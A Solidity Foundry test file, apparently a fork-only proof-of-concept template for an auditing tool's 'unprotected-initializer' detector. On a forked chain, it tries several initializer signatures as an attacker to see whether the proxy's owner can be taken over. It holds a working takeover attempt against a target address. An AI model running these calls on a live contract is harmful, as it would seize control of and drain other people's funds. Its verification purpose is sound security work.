// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Unprotected initializer (proxy takeover)
/// @notice Detector: unprotected-initializer. A proxy's initialize() has no
///         guard (no `initializer` modifier, or it can be called twice), so
///         ANY caller can initialize the proxy and become its owner/admin.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt the initialize signature to
///      the target (initialize(address) / initialize(address,address) /
///      initialize(bytes)).

contract PoC is Test {
    address public target;
    uint256 public forkBlock;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function _staticAddr(address t, bytes memory data) internal view returns (address v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (address));
    }

    function _staticBool(address t, bytes memory data) internal view returns (bool v) {
        (bool ok, bytes memory ret) = t.staticcall(data);
        if (ok && ret.length >= 32) v = abi.decode(ret, (bool));
    }

    /// @dev Fingerprint of the state an initializer of this class would move:
    ///      the owner slot, the initialized flag, and raw slot 0. A guarded or
    ///      already-run initializer returns (or reverts) without touching these.
    function _observe(address attacker) internal view returns (uint256) {
        return uint256(
            keccak256(
                abi.encode(
                    _staticAddr(target, abi.encodeWithSignature("owner()")),
                    _staticBool(target, abi.encodeWithSignature("initialized()")),
                    attacker.balance,
                    vm.load(target, bytes32(0))
                )
            )
        );
    }

    /// Try each plausible entry point and accept the first that changes the
    /// OBSERVABLE -- never the first that returns. A no-op or already-guarded
    /// function returns successfully and changes nothing, so judging by the call
    /// result reports "not reproduced" for a vulnerability that exists under
    /// another name.
    function _attempt(address attacker, uint256 before, string memory label, bytes memory data)
        internal
        returns (string memory)
    {
        vm.prank(attacker);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _observe(attacker) != before) return label;
        return "";
    }

    function _tryEntry(address attacker, uint256 before) internal returns (string memory used) {
        address[] memory one = new address[](1);
        one[0] = attacker;

        used = _attempt(
            attacker,
            before,
            "initialize(address)",
            abi.encodeWithSignature("initialize(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initialize(address,address)",
            abi.encodeWithSignature("initialize(address,address)", attacker, attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "initialize()", abi.encodeWithSignature("initialize()")
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initialize(address[])",
            abi.encodeWithSignature("initialize(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker, before, "init(address)", abi.encodeWithSignature("init(address)", attacker)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "initWallet(address[])",
            abi.encodeWithSignature("initWallet(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        used = _attempt(
            attacker,
            before,
            "init(address[])",
            abi.encodeWithSignature("init(address[])", one)
        );
        if (bytes(used).length > 0) return used;
        return "";
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _observe(attackerEOA);
        string memory used = _tryEntry(attackerEOA, before);
        console.log("entry point that changed state:", used);

        uint256 afterState = _observe(attackerEOA);
        uint256 delta = afterState != before ? 1 : 0;
        assertGt(
            delta,
            0,
            "no initializer variant changed the owner/initialized observable. Tried initialize(address), initialize(address,address), initialize(), initialize(address[]), init(address), initWallet(address[]), init(address[]). This does NOT establish safety: the initializer may be guarded by an `initializer` modifier or an owner check, already initialized, named differently, take other arguments, or the owner may live in another slot."
        );
    }
}
